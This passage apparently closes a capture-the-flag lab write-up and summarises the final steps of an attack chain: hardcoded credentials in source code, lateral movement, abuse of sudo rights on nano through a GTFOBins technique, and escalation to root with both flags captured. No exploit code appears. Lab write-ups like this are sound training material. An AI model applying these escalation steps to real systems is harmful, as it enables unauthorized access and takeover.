10. **Source Code Discovery**: Examination of the application source code revealed hardcoded credentials for all application users, including pocahontas.

11. **Second Lateral Movement**: Authentication as pocahontas using the discovered credentials.

12. **Nano GTFOBins Exploit**: The pocahontas user's sudo privileges to execute nano as geronimo without a password were exploited using the nano -s flag technique to execute arbitrary commands.

13. **Geronimo Access**: With geronimo's privileges and sudo group membership, a direct sudo -i command provided unrestricted root access.

14. **Root Compromise**: Full system compromise with root-level access and successful capture of both user and root flags.

